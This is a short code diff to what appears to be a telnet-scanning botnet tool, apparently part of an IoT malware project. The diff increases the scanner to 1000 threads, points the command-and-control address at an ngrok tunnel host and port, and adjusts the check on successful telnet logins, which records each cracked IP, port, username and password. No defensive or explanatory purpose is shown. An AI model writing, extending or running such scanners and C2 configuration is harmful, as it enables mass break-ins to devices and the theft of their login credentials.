@@ -2,10 +2,10 @@ from lib import telnet, tools, network, console
 import threading, socket, time
 
 __SCAN_TELNET__ = True
-__SCAN_THREAD__ = 700
+__SCAN_THREAD__ = 1000
 
-__CNC_ADDR__ = '127.0.0.1'
-__CNC_PORT__ = 36834
+__CNC_ADDR__ = '0.tcp.ngrok.io'
+__CNC_PORT__ = 12681
 
 class Data:
     def __init__(self):
@@ -72,7 +72,7 @@ class TelnetScanner(threading.Thread):
 
             res = telnet.Telnet(ip, port, username, password).connect(2, True)
 
-            if res:
+            if res == True:
                 self.data.found.append(f'scan|{ip}|{port}|{username}|{password}|telnet') # scan|ip|port|user|pass|type
                 break
             
